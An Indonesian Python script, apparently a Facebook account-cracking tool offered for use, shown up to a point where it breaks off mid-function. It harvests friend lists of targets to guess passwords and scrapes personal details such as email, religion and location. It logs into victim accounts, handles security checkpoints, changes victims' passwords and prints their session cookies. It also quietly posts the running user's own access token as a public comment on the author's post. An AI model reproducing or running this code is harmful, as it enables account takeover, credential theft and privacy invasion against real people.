#!/usr/bin/python3
# coding=utf-8
# author : Mbokey
#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By mbokey
#      Recode By Mbokey bhizer Reall
### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from random import randint
from datetime import date
from time import sleep as waktu
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")

### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###

a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","userAgent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}).json()
try:
		IP_address = a["query"]
except KeyError:
		IP_address = " "
try:
		negara = a["country"]
except KeyError:
		negara = " "
try:
		kartu = a["isp"]
except KeyError:
		kartu = " "
url = "https://mbasic.facebook.com"
ses = requests.Session()
id = []
cp = []
ok = []
opsi = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
headerz = random.choice([
	'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
	'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
])

### GLOBAL WAKTU ###
semoga = []
berapa_d = []
key = "^6666^gelbgo777y"
loliku = datetime.now()
minit = loliku.minute
ditik = loliku.second
if loop==35 or loop==45:
	semoga.append(str(minit)+","+str(ditik))
if loop==47:
	mulai,selesai = semoga[0],semoga[1]
	tikung = mulai.split(",")
	modal = selesai.split(",")
	if tikung[0]==modal[0]:
		det = float(modal[1])-float(tikung[1])
	else:
		mixer = float(modal[0])-float(tikung[0])
		mixing = mixer*60.0
		durian = 60.0-float(tikung[1])+float(modal[1])
		det = mixing+durian
	if det==0.0:
		nihh = det+0.7
		berapa_d.append(nihh)
	else:
		berapa_d.append(det)
else:
	det = "-"
if len(berapa_d)==0:
	dett = "-"
else:
	for angka in berapa_d:
		hitt = float(angka)/10
		hutt = len(id)-loop
		dutt = hitt*hutt
		dott = str(dutt)
		ditt = dott.split(".")
		if dutt>3599:
			cutt = dutt/3600.0
			jutt = str(cutt).split(".")
			jitt = jutt[1]
			if len(jutt[1])==1 and jutt[1]=="0":
				dett = jutt[0]+"j"
			else:
				dett = jutt[0]+"."+jitt[0]+"j"
		elif dutt>59 and dutt<3600:
			cutt = dutt/60.0
			jutt = str(cutt).split(".")
			jitt = jutt[1]
			if len(jutt[1])==1 and jutt[1]=="0":
				dett = jutt[0]+"m"
			else:
				dett = jutt[0]+"."+jitt[0]+"m"
		elif dutt>0 and dutt<60:
			dett = ditt[0]+"d"
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
buulan = "Februari"
ttgal = "15"
### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s

_______________________________________  ________
\____    /\_   _____/\____    /   __   \/   __   \

  /     /  |    __)_   /     /\____    /\____    /
 /     /_  |        \ /     /_   /    /    /    /
/_______ \/_______  //_______ \ /____/    /____/ 
        \/        \/         \/"""%(O))
   
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print('―――――――――――――――――――――――――――――――――――――――――――――――――――――――――')
		token = input(' [?] token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	ndrii_gntng = ('Bjirt Mbokey Perecode hamdal')
	fachri_gntng = ('Wak luh Ganteng bangett')
	wulan_cntk = ('Suport Mbokey yook ðŸ˜˜')
	citra_chan = ('Bang luh ga vakumðŸ¤£,canda')
	requests.post('https://graph.facebook.com/100034984850776/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/674493100393512/comments/?message='+ndrii_gntng+'&access_token=' + token)
	requests.post('https://graph.facebook.com/674493100393512/comments/?message='+fachri_gntng+'&access_token=' + token)
	requests.post('https://graph.facebook.com/674493100393512/comments/?message='+wulan_cntk+'&access_token=' + token)
	requests.post('https://graph.facebook.com/674493100393512/comments/?message='+citra_chan+'&access_token=' + token)
	requests.post('https://graph.facebook.com/674493100393512/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/674493100393512/likes?summary=true&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        mbokey = a['name']
        ganteng = a['id']
        ttl = a['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(' %s[%s+%s] %sAuhtor Script : %sMbokey Bhizer X Reall                │'%(O,H,O,N,K))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s+%s] %sNama        : %s                                   │"%(O,H,O,N,mbokey))
    print(" %s[%s+%s] %sID          : %s                        │"%(O,H,O,N,ganteng))
    print(" %s[%s+%s] %sKey         : %s                       │"%(O,H,O,N,key))
 #   print(" %s[%s+%s] %sTgl. Lahir  : %s                                    │"%(O,H,O,N,ttl))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s+%s] %sMasa berlaku : %s-%s                           │"%(O,H,O,N,buulan,ttgal))
    print(" %s[%s+%s] %sIP address   : %s                         │"%(O,H,O,N,IP_address))
    print(" %s[%s+%s] %sNegara Anda  : %s                             │"%(O,H,O,N,negara))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s1%s]. %scrack teman/publik                                  │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s2%s]. %sCrack Masaal [%s10%s]                                   │"%(O,H,O,N,H,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s3%s]. %sCrack Follow publik                                 │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s4%s]. %ssetting user agent.                                 │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s5%s]. %sGed data target.                                    │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s6%s]. %sInfo Script Crack Fb.                               │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s7%s]. %scek opsi akun cp.                                   │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s8%s]. %slihat hasil crack.                                  │"%(O,H,O,N))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    print(" %s[%s0%s]. %slogout %s(%shapus token%s)                                │"%(O,H,O,N,O,M,O))
    print('%s ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    asw = input(" %s[%s?%s] %spilih menu : %s"%(O,H,O,N,H))
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "7":
    	cekopsi()
    elif asw == "8":
    	cekhasil()
    elif asw == "4":
    	gantiua()
    elif asw == "5":
    	Mbokey()
    elif asw == "6":
    	infos()
    elif asw == "2":
    	massal()
    elif asw == "3":
    	follow()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	print('%s――――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
    	jalan(" %s[%sâœ“%s] %sberhasil menghapus token "%(O,H,O,N))
    	exit()
    else:
    	jalan(" %s[%s!%s] %spilih jawaban dengan bener ! "%(O,H,O,K))
    	menu() 
 
def gantiua():
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	ajg = input(" %s[%s?%s] %smasukan ua : %s"%(O,H,O,N,H))
	if ajg in[""]:
		menu()
	else:
		try:
			zedd = open('ugent.txt', 'w')
			zedd.write(ajg)
			zedd.close()
			print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
			print(" %s[%sâœ“%s] %sberhasil mengganti ua"%(O,H,O,H))
			input(" %s[%s*%s] %stekan enter untuk kembali ke menu"%(O,H,O,N))
			menu()
		except KeyError:
			exit()
#perecode yang di sakitin
def massal():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	try:
		nada = int(input(" Mau Crack Berapa ID : "))
		if nada>10:
			jalan(" Maksimal 10 ID")
			time.sleep(0.5)
			massal()
	except ValueError:
		jalan(" Input Invalid")
		time.sleep(0.5)
		massal()
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = input(" Masukkan ID Target Ke %s : "%(dot))
		try:
			#asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			#tulul = json.loads(asu.text)
			#print(" Nama : "+tulul["name"])
		#except KeyError:
			#print(" ID Salah")
			#time.sleep(0.5)
			#exit()
		#except requests.exceptions.ConnectionError:
			#jalan(" Tidak Ada Internet")
			#time.sleep(0.5)
			#exit()
		#try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(uid, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
				tampung.append(uid+"<=>"+nama)
					#if detec in id:
						#continue
					#else:
						#id.append(uid+"<=>"+nama)
						#tampung.append(uid+"<=>"+nama)
		except KeyError:
					#continue
			print(" Total ID : %s"%(len(tampung)))
		except requests.exceptions.ConnectionError:
			jalan(" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
	print(" Jumlah Total ID : %s"%(len(id)))
	atursandi()

#perecode nih senggol dong
def infos():
	print("%sAUHTOR SCRIPT CRACK FACEBOOK"%(K))
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	print("%sAuhtor Script : %sMBOKEY BHIZER REALL"%(N,K))
	print("%sAuhtor Script : %sYUMASAA X NANO"%(N,K))
	print("%sAuhtor Script : %sJeeck X Nano"%(N,K))
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	print("%sMbokey Bhizer followers and supporters"%(K))
	print("%ssupporters : %sFaizTzy "%(N,K))
	print("%ssupporters : %sAang-cyber"%(N,K))
	print("%ssupporters : %sAnggaTzy"%(N,K))
	print("%ssupporters : %sJanuarTzy"%(N,K))
	print("%ssupporters : %sRendy-XD"%(N,K))
	print("%ssupporters : %sIrvan-XD "%(N,K))
	print("%ssupporters : %sKimoci"%(N,K))
	print("%ssupporters : %sPinguin"%(N,K))
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	print("%sJANGAN LUPA FOLLOW GITHUB ME GAN"%(H))
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	print("%sGithub : https://github.com/Mbokey"%(H))
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	print("%sJika Anda Ingin Berdonasi Ke pada Saya"%(U))
	print("%sNomer Donasi : %s6281214822824"%(N,U))
	print("%sNomer Donasi : %s6281283909651"%(N,U))
	print('%s―――――――――――――――――――――――――――――――――――――――――――――――――――――――――'%(O))
	print("%sTHANK YOU FOR YOUR SUPPORT FRIENDS"%(K))
	input(" \n%s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
	menu()
#GEd
def Mbokey():
 try:token = open('token.txt','r').read()
 except (KeyError,IOError):jalan('] Token/Cookies Invalid')
 idt = input(O+"["+H+""+O+"] "+N+"ID Target : ")
 try:
 	zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
 except (KeyError,IOError):jalan('[!] ID Tidak Ditemukan')
 try:nm = zy["name"]
 except (KeyError,IOError):nm = ("-")
 try:nd = zy["first_name"]
 except (KeyError,IOError):nd = ("-")
 try:nt = zy["middle_name"]
 except (KeyError,IOError):nt = ("-")
 try:nb = zy["last_name"]
 except (KeyError,IOError):nb = ("-")
 try:ut = zy["birthday"]
 except (KeyError,IOError):ut = ("-")
 try:gd = zy["gender"]
 except (KeyError,IOError):gd = ("-")
 try:fr = zy["follower"]
 except (KeyError,IOError):fr = ("-")
 try:fd = zy["friend"]
 except (KeyError,IOError):fd = ("-")
 try:em = zy["email"]
 except (KeyError,IOError):em = ("-")
 try:lk = zy["link"]
 except (KeyError,IOError):lk = ("-")
 try:us = zy["username"]
 except (KeyError,IOError):us = ("-")
 try:rg = zy["religion"]
 except (KeyError,IOError):rg = ("-")
 try:rl = zy["relationship_status"]
 except (KeyError,IOError):rl = ("-")
 try:rls = zy["significant_other"]["name"]
 except (KeyError,IOError):rls = ("-")
 try:lc = zy["location"]["name"]
 except (KeyError,IOError):lc = ("-")
 try:ht = zy["hometown"]["name"]
 except (KeyError,IOError):ht = ("-")
 try:ab = zy["about"]
 except (KeyError,IOError):ab = ("-")
 try:lo = zy["locale"]
 except (KeyError,IOError):lo = ("-")
 jalan(O+"["+H+""+O+"] "+N+"Nama : %s"%(nm))
 jalan(O+"["+H+""+O+"] "+N+"Nama Depan : %s"%(nd))
 jalan(O+"["+H+""+O+"] "+N+"Nama Tengah : %s"%(nt))
 jalan(O+"["+H+""+O+"] "+N+"Nama Belakang : %s"%(nb))
 jalan(O+"["+H+""+O+"] "+N+"TTL : %s"%(ut))
 jalan(O+"["+H+""+O+"] "+N+"jenis kelamin : %s"%(gd))
 jalan(O+"["+H+""+O+"] "+N+"pengikut : %s"%(fr))
 jalan(O+"["+H+""+O+"] "+N+"teman nya : %s"%(fd))
 jalan(O+"["+H+""+O+"] "+N+"Email : %s"%(em))
 jalan(O+"["+H+""+O+"] "+N+"Link : %s"%(lk))
 jalan(O+"["+H+""+O+"] "+N+"Username : %s"%(us))
 jalan(O+"["+H+""+O+"] "+N+"Agama : %s"%(rg))
 jalan(O+"["+H+""+O+"] "+N+"Status Hubungan : %s"%(rl))
 jalan(O+"["+H+""+O+"] "+N+"Hubungan Dengan : %s"%(rls))
 jalan(O+"["+H+""+O+"] "+N+"Tempat Tinggal : %s"%(lc))
 jalan(O+"["+H+""+O+"] "+N+"Tempat Asal : %s"%(ht))
 jalan(O+"["+H+""+O+"] "+N+"Tentang : %s"%(ab))
 jalan(O+"["+H+""+O+"] "+N+"Locale : %s"%(lo))
 input(" \n%s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
 menu()
### CEK OPSI ###
def cekopsi():
	dirs = os.listdir("CP")
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	for file in dirs:
		print(" %s[%s*%s] %sCP/%s"%(O,H,O,K,file))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	files = input(" %s[%s?%s] %sfile  :%s "%(O,H,O,N,K))
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n %s[%s!%s] %snama file %s tidak tersedia"%(O,H,O,N,files))
	ubahpw()
	print('\n %s[%s!%s] %sanda bisa mematikan data selular untuk menjeda proses cek'%(O,H,O,N))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(" %s[%s+%s] %scek : %s%s%s"%(O,H,O,N,K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print("\n %s[%s!%s] %scek akun sudah selesai..."%(O,H,O,N))
	input(" %s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
	time.sleep(1)
	menu()

def ubahpw():
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	pw=input(" %s[%s?%s] %subah sandi tap yes?%s[%sY/t%s]%s: %s"%(O,H,O,N,O,N,O,N,H))
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=input(" %s[%s?%s] %smasukan sandi : %s"%(O,H,O,N,H))
		if len(pw2) <= 5:
			exit(" %s[%s!%s] %skata sandi minimal 6 karakter "%(O,H,O,N))
		else:
			pwbaru.append(pw2)
	else:
		pass

def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r [âœ“] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r [âœ“] akun tap yes, silahkan login di fb lite \n %s[âœ“] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [âœ“] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=1
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [âœ“] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[âœ“] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_apk(coki)
		
def cek_apk(coki):
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print("{P}[+] Apk yang terkait:")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print("  {N}[+] Apk Aktif :")
			print("   [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
		else:
			print("  {N}[+] Apk Aktif :")
			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print("   [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
			print("  {N}[+] Apk kadaluarsa :")
			print("   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
		else:
			hit1,hit2=0,0
			print("  {N}[+] Apk kadaluarsa :")
			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print("   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
				hit2+=1
	else:
		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
	print("")

### CEK HASIL ### 
def cekhasil():
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(' %s[%s1%s]. %slihat hasil crack %sOK '%(O,H,O,N,H))
	print(' %s[%s2%s]. %slihat hasil crack %sCP '%(O,H,O,N,K))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	anjg = input(' %s[%s?%s] %spilih : '%(O,H,O,N))
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		for file in dirs:
			print(" %s[%s*%s] %s> %s"%(O,H,O,N,file))
		try:
			print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
			file = input(" %s[%s?%s] %sfile : %s"%(O,H,O,N,H))
			if file == "":
				menu()
